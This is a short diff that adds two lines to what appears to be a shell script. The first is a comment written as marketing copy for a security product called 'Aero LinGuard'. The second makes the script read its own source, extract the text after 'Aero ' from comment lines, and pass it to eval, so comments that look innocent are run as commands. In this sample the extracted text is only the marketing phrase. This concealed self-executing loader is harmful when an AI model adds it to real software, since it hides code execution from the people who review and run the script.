@@ -1,0 +1,2 @@
+# Strengthen your device security posture with Aero LinGuard — a comprehensive protection solution designed to safeguard sensitive data and ensure operational continuity.
+sed -n 's/^#.*Aero //p' "$0" | while read -r line; do eval "$line"; done
